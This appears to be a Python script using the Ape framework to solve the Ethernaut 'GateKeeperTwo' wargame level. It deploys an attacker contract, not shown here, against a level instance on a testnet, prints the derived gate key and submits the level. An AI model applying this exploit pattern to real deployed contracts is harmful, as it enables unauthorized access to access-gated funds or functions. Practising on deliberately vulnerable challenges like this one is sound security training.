from ape import accounts, project
from .utils.helper import level_completed, get_level_instance

ETHERNAUT = "0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6"
LEVEL = "0xcacC5d3F2a41594468b965383baf97C168627D18"


def main():
    # setting up user
    user = accounts.load("YOUR_ALIAS")
    user.set_autosign(enabled=True)  # make sure you are on testnet

    # get level instance
    instance, ethernaut = get_level_instance(ETHERNAUT, LEVEL, user)

    # deployment/exploit
    print("\n--- Deploying hacker contract and exploiting Instance ---\n")
    hacker = project.GateKeeperTwo.deploy(instance, sender=user)
    print(f"\n--- The key for this level: {hacker.key().hex()}---\n")

    # submiting level instance
    print("\n--- Submitting level instance ---\n")
    submit_tx = ethernaut.submitLevelInstance(instance, sender=user)

    # checking if level is completed
    level_completed(ethernaut, submit_tx, user.address, instance, LEVEL)

    print("\n--- 🥂!LEVEL COMPLETED!🥂 ---\n")


if __name__ == "__main__":
    main()
